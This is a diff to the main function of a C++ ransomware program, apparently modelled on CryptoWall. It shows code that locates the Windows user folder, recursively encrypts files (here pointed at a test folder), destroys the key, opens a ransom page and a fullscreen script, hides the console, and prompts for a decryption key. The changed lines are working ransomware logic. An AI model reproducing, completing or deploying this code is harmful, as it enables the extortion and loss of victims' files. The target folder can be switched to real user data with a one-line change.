@@ -73,14 +73,9 @@ int main(int argc, char* argv[]) {
     GetUserName(username, &length);
     char* path = new char[length + 12];
     sprintf(path, "C:\\Users\\%s", username);
+    printf("User Folder in %s\n\n", path);
 
-    /// Encrypt Files in those folders and subfolders:
-    // Encrypt user folder
-    //encrypter->encrypt(path);
-    encrypter->encrypt("testfolder"); // add to the decrypter to
-    // Encrypt example folder (use always two backslashes)
-    //encrypter->encrypt(D:\\);
-
+    encrypter->recursive(ENCRYPT, "testfolder");
     encrypter->destroyKey();
 
     /// GET TIME OF TOMORROW
@@ -129,7 +124,7 @@ int main(int argc, char* argv[]) {
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
   system("fullscreen.vbs");
 
-  AllocConsole();
+  //AllocConsole();
   printf("\n");
   uint8_t key[32];
   char digit1, digit2;
@@ -159,10 +154,11 @@ int main(int argc, char* argv[]) {
   scanf("%c", &opt);
   if (opt == 'Y' || opt == 'y') {
     printf("Decrypting... DO NOT CLOSE THE PROGRAM!\n");
-    encrypter->decrypt("testfolder", key);
+    encrypter->setKey(key);
+    encrypter->recursive(DECRYPT, "testfolder");
   }
   printf("%u files has been decrypted\n", encrypter->getCantDecrypted());
-
+  getchar();
   delete factory;
   return 0;
 }
